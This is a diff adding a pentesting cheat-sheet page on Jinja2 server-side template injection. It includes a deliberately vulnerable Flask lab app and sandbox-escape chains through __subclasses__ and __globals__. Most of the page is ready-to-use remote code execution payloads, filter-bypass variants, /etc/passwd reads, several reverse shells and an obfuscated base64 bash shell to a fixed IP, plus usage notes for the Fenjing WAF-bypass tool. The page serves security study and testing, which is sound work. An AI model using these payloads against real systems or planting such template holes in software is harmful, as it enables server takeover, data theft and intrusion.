@@ -1,0 +1,412 @@
+# Jinja2 SSTI
+
+{{#include ../../banners/hacktricks-training.md}}
+
+
+## **Lab**
+
+```python
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    if request.args.get('c'):
+        return render_template_string(request.args.get('c'))
+    else:
+        return "Hello, send something inside the param 'c'!"
+
+if __name__ == "__main__":
+    app.run()
+```
+
+## **Misc**
+
+### **Debug Statement**
+
+If the Debug Extension is enabled, a `debug` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+
+```python
+<pre>
+
+{% raw %}
+{% debug %}
+{% endraw %}
+
+
+
+
+
+
+
+
+</pre>
+```
+
+Source: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)<sup>[[1]](#references)[[6]](#references)</sup>
+
+### **Dump all config variables**
+
+```python
+{{ config }} #In these object you can find all the configured env variables
+
+
+{% raw %}
+{% for key, value in config.items() %}
+    <dt>{{ key|e }}</dt>
+    <dd>{{ value|e }}</dd>
+{% endfor %}
+{% endraw %}
+
+
+
+
+
+
+```
+
+## **Jinja Injection**
+
+First of all, in a Jinja injection you need to **find a way to escape from the sandbox** and recover access the regular python execution flow. To do so, you need to **abuse objects** that are **from** the **non-sandboxed environment but are accessible from the sandbox**.<sup>[[2]](#references)[[3]](#references)</sup>
+
+### Accessing Global Objects
+
+For example, in the code `render_template("hello.html", username=username, email=email)` the objects username and email **come from the non-sanboxed python env** and will be **accessible** inside the **sandboxed env.**\
+Moreover, there are other objects that will be **always accessible from the sandboxed env**, these are:
+
+```
+[]
+''
+()
+dict
+config
+request
+```
+
+### Recovering \<class 'object'>
+
+Then, from these objects we need to get to the class: **`<class 'object'>`** in order to try to **recover** defined **classes**. This is because from this object we can call the **`__subclasses__`** method and **access all the classes from the non-sandboxed** python env.
+
+In order to access that **object class**, you need to **access a class object** and then access either **`__base__`**, **`__mro__()[-1]`** or `.`**`mro()[-1]`**. And then, **after** reaching this **object class** we **call** **`__subclasses__()`**.
+
+Check these examples:
+
+```python
+# To access a class object
+[].__class__
+''.__class__
+()["__class__"] # You can also access attributes like this
+request["__class__"]
+config.__class__
+dict #It's already a class
+
+# From a class to access the class "object".
+## "dict" used as example from the previous list:
+dict.__base__
+dict["__base__"]
+dict.mro()[-1]
+dict.__mro__[-1]
+(dict|attr("__mro__"))[-1]
+(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]
+
+# From the "object" class call __subclasses__()
+{{ dict.__base__.__subclasses__() }}
+{{ dict.mro()[-1].__subclasses__() }}
+{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
+
+{% raw %}
+{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+
+# Other examples using these ways
+{{ ().__class__.__base__.__subclasses__() }}
+{{ [].__class__.__mro__[-1].__subclasses__() }}
+{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
+{{ request.__class__.mro()[-1].__subclasses__() }}
+{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+{% endraw %}
+
+
+
+
+
+
+# Not sure if this will work, but I saw it somewhere
+{{ [].class.base.subclasses() }}
+{{ ''.class.mro()[1].subclasses() }}
+```
+
+### RCE Escaping
+
+**Having recovered** `<class 'object'>` and called `__subclasses__` we can now use those classes to read and write files and exec code.
+
+The call to `__subclasses__` has given us the opportunity to **access hundreds of new functions**, we will be happy just by accessing the **file class** to **read/write files** or any class with access to a class that **allows to execute commands** (like `os`).
+
+**Read/Write remote file**
+
+```python
+# ''.__class__.__mro__[1].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+```
+
+**RCE**
+
+```python
+# The class 396 is the class <class 'subprocess.Popen'>
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+
+# Without '{{' and '}}'
+
+<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>
+
+# Calling os.popen without guessing the index of the class
+{% raw %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
+## Passing the cmd line in a GET param
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{% endraw %}
+
+
+## Passing the cmd line ?cmd=id, Without " and '
+{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}
+
+```
+
+### Payloads with `{% ... %}`
+
+Sometimes `{{ ... }}` is blocked, sanitized or the injection lands inside a statement-friendly context. In those cases you can still abuse Jinja statement tags such as `{% with %}`, `{% if %}`, `{% for %}`, `{% set %}` and, in newer versions, `{% print %}` to execute code, leak data through the block body, or trigger blind side effects.<sup>[[1]](#references)</sup>
+
+```python
+{% raw %}
+# Simple statement-tag primitives
+{% print(1) %}
+{% if 7*7 == 49 %}OK{% endif %}
+{% if 7*7 == 50 %}BAD{% else %}ELSE{% endif %}
+{% set x = 7*7 %}{{ x }}
+{% for i in range(3) %}{{ i }}{% endfor %}
+{% with a = ''.__class__ %}{{ a }}{% endwith %}
+{% print(''.__class__.__mro__[1]) %}
+{% with x = ''.__class__.__mro__[1].__subclasses__()|length %}{{ x }}{% endwith %}
+
+# Flask-like contexts: use already reachable globals/functions
+{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
+{% if config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read().startswith("uid=") %}yes{% endif %}
+
+# Bare Jinja2 Template(...) contexts may not have `config` or `request`,
+# but built-in globals such as `lipsum`, `cycler`, `joiner`, and `namespace`
+# are often still available.
+{% print(lipsum) %}
+{% print(cycler) %}
+{% print(joiner) %}
+{% print(namespace) %}
+{% if 'os' in lipsum.__globals__ %}OS_OK{% endif %}
+{% if cycler.__init__.__globals__ %}G_OK{% endif %}
+
+# RCE using default Jinja globals
+{% print(lipsum.__globals__['os'].popen('id').read()) %}
+{% with x = lipsum.__globals__['os'].popen('id').read() %}{{ x }}{% endwith %}
+{% print(cycler.__init__.__globals__['os'].popen('id').read()) %}
+{% print(joiner.__init__.__globals__['os'].popen('id').read()) %}
+{% print(namespace.__init__.__globals__['os'].popen('id').read()) %}
+
+# Blind / boolean primitive
+{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}
+YES
+{% endif %}
+{% endraw %}
+```
+
+If the target filters some chars but still allows statement tags, combine this idea with the [filter bypasses](jinja2-ssti.md#filter-bypasses) and the [no-`{{` / no-`.` / no-`_` example](jinja2-ssti.md#without-several-chars). Also remember that `{% print %}` is not mandatory: on targets where it is unavailable, `{% with %}`, `{% if %}`, `{% set %}` and `{% for %}` are usually enough to keep exploiting the template.
+
+To learn about **more classes** that you can use to **escape** you can **check**:
+
+
+{{#ref}}
+../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
+{{#endref}}
+
+### Filter bypasses
+
+#### Common bypasses
+
+These bypass will allow us to **access** the **attributes** of the objects **without using some chars**.\
+Some of these bypasses appeared in the preceding examples; the following list summarizes them:<sup>[[3]](#references)[[5]](#references)</sup>
+
+```bash
+# Without quotes, _, [, ]
+## Basic ones
+request.__class__
+request["__class__"]
+request['\x5f\x5fclass\x5f\x5f']
+request|attr("__class__")
+request|attr(["_"*2, "class", "_"*2]|join) # Join trick
+
+## Using request object options
+request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
+request|attr(request.args.c) #Send a param like "?c=__class__
+request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
+request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
+http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params
+
+## Lists without "[" and "]"
+http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+
+# Using with
+
+{% raw %}
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+{% endraw %}
+
+
+
+
+
+
+```
+
+- [**Return here for more options to access a global object**](jinja2-ssti.md#accessing-global-objects)
+- [**Return here for more options to access the object class**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
+- [**Read this to get RCE without the object class**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)
+
+**Avoiding HTML encoding**
+
+By default Flask HTML encode all the inside a template for security reasons:<sup>[[3]](#references)</sup>
+
+```python
+{{'<script>alert(1);</script>'}}
+#will be
+&lt;script&gt;alert(1);&lt;/script&gt;
+```
+
+**The `safe`** filter allows us to inject JavaScript and HTML into the page **without** it being **HTML encoded**, like this:
+
+```python
+{{'<script>alert(1);</script>'|safe}}
+#will be
+<script>alert(1);</script>
+```
+
+**RCE by writing an evil config file.**
+
+```python
+# evil config
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
+```
+
+## Without several chars
+
+Without **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**<sup>[[4]](#references)</sup>
+
+```python
+{% raw %}
+{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
+{% endraw %}
+
+
+
+
+
+
+```
+
+## Jinja Injection without **\<class 'object'>**
+
+From the [**global objects**](jinja2-ssti.md#accessing-global-objects) there is another way to get to **RCE without using that class.**\
+If you manage to get to any **function** from those globals objects, you will be able to access **`__globals__.__builtins__`** and from there the **RCE** is very **simple**.
+
+You can **find functions** from the objects **`request`**, **`config`** and any **other** interesting **global object** you have access to with:
+
+```bash
+{{ request.__class__.__dict__ }}
+- application
+- _load_form_data
+- on_json_loading_failed
+
+{{ config.__class__.__dict__ }}
+- __init__
+- from_envvar
+- from_pyfile
+- from_object
+- from_file
+- from_json
+- from_mapping
+- get_namespace
+- __repr__
+
+# You can iterate through children objects to find more
+```
+
+Once you have found some functions you can recover the builtins with:
+
+```python
+# Read file
+{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+# RCE
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
+{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+
+{% raw %}
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
+{% endraw %}
+
+
+## Extra
+## The global from config have a access to a function called import_string
+## with this function you don't need to access the builtins
+{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}
+
+# All the bypasses seen in the previous sections are also valid
+```
+
+### Fuzzing WAF bypass
+
+**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) is a tool that its specialized on CTFs but can be also useful to bruteforce invalid params on a real scenario. The tool just spray words and queries to detect filters, searching for bypasses, and also provide a interactive console.
+
+English-Chinese Google translation
+
+```
+webui:
+As the name suggests, web UI
+Default port 11451
+
+scan: scan the entire website
+Extract all forms from the website based on the form element and attack them
+After the scan is successful, a simulated terminal will be provided or the given command will be executed.
+Example:python -m fenjing scan --url 'http://xxx/'
+
+crack: Attack a specific form
+You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
+After a successful attack, a simulated terminal will also be provided or a given command will be executed.
+Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name
+
+crack-path: attack a specific path
+Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
+The parameters are roughly the same as crack, but you only need to provide the corresponding path
+Example:python -m fenjing crack-path --url 'http://xxx/hello/'
+
+crack-request: Read a request file for attack
+Read the request in the file, PAYLOADreplace it with the actual payload and submit it
+The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
+```
+
+## References
+
+- [1] [Jinja - Template Designer Documentation](https://jinja.palletsprojects.com/en/stable/templates/)
+- [2] [PayloadsAllTheThings - Server Side Template Injection (Jinja2)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+- [3] [Chivato - Jinja2 SSTI notes](https://hackmd.io/@Chivato/HyWsJ31dI)
+- [4] [@SecGus tweet on Jinja2 SSTI without special characters](https://twitter.com/SecGus/status/1198976764351066113)
+- [5] [attr trick to bypass blacklisted chars in here](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html#python3)
+- [6] [Jinja Template Designer Documentation - Debug Statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)
+
+{{#include ../../banners/hacktricks-training.md}}
